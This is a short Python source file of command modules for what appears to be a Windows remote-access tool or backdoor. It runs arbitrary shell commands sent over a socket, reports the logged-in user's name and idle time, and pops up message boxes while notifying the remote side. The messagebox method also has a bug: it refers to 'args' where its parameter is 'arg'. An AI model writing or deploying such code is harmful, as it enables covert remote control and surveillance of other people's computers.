import subprocess,win32api,ctypes,getpass,sock
class cmd:
    def __init__(self):
        self.command = 'cmd'
        self.description = 'shell command execution\n'
        self.args = True
    def main(self,data):
        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        stdout_value = proc.stdout.read() + proc.stderr.read()
        return stdout_value
class getidletime:
    def __init__(self):
        self.command = 'getidletime'
        self.description = 'printing user idle time in seconds\n'
        self.args = False
    def main(self):
        return str((win32api.GetTickCount() - win32api.GetLastInputInfo()) / 1000.0)+'\n'
class getuser:
    def __init__(self):
        self.command = 'getusername'
        self.description = 'printing the username of the currently logged in user'
        self.args = False
    def main(self):
        return getpass.getuser()+'\n'
class messagebox:
    def __init__(self):
        self.command = 'messagebox'
        self.description = 'generating a custom messagebox with: messagebox <message> <window title>'
    def main(self,arg):
        Box = ctypes.windll.user32.MessageBoxA
        sock.sock.s.send("Box was opened\n")
        Box(None,args.split(" ")[0],args.split(" ")[1], 0)
        return "Message box was closed\n"
